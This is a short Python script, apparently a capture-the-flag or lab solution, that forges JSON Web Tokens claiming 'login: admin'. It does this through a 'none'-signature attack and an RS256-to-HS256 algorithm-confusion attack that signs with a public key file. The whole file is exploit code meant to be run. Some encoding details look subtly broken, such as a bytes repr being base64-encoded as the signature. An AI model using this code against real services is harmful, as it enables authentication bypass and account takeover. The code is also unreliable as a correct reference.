import jwt
import json
import hashlib
import hmac
import base64

def base64url_encode(input):
    return str(base64.urlsafe_b64encode(str(json.dumps(input)).encode("utf-8")), 'utf-8').replace('=', '')

def none_signature_attack(payload, key, algorithm):
    segments = []

    # Header
    header = {"typ": "JWT", "alg": algorithm}
    segments.append(base64url_encode(header))
    data = {"login":"admin", "iat": "1578925310"}
    segments.append(base64url_encode(data))
    signature = {}
    segments.append(base64url_encode(signature))
    return '.'.join(segments)

signing_methods = {
    'HS256': lambda msg, key: hmac.new(key.encode("utf-8"), msg.encode("utf-8"), hashlib.sha256).digest(),
    'HS384': lambda msg, key: hmac.new(key, msg, hashlib.sha384).digest(),
    'HS512': lambda msg, key: hmac.new(key, msg, hashlib.sha512).digest(),
}

def chagne_algorithm_attack(payload, key, algorithm):
  ''' given
  {
    "typ": "JWT",
    "alg": "RS256"
  }
  it should be "HS256"
  '''
  segments = []

  # Header
  header = {"typ": "JWS", "alg": algorithm}
  segments.append(base64url_encode(header))
  data = {"login":"admin", "iat": "1578925310"}
  segments.append(base64url_encode(data))
  signing_input = '.'.join(segments)

  key = open(key, "r").read()
  try:
    signature = signing_methods[algorithm](signing_input, key)
    credentials = '{}'.format(signature)
    segments.append(base64.urlsafe_b64encode(credentials.encode('utf-8')).decode('utf-8'))
  except KeyError as e:
    print(e)
    raise NotImplementedError("Algorithm not supported")

  return '.'.join(segments)

msg = chagne_algorithm_attack({"login":"admin"}, "fixtures/002.pub", algorithm="HS256")
print(msg)
